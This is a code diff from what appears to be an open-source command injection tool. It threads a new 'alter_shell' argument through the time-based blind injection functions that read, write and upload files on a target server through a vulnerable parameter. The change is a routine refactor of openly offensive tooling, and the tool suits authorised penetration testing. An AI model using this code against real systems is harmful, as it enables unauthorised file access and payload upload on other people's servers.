@@ -28,7 +28,7 @@ from src.core.injections.blind_based.techniques.time_based import tb_injector
  The "time-based" injection technique on Blind OS Command Injection.
 """
 
-def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter):
+def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell):
   
   #  Read file
   if menu.options.file_read:
@@ -36,7 +36,7 @@ def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vu
     
     # Execute command
     cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
+    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
     
@@ -77,13 +77,13 @@ def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vu
       
     # Execute command
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
-    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
+    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_write + ")"
-    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
+    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
     if shell:
@@ -118,13 +118,13 @@ def do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vu
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
+    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_upload + ")"
-    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter)
+    check_how_long,output = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
     
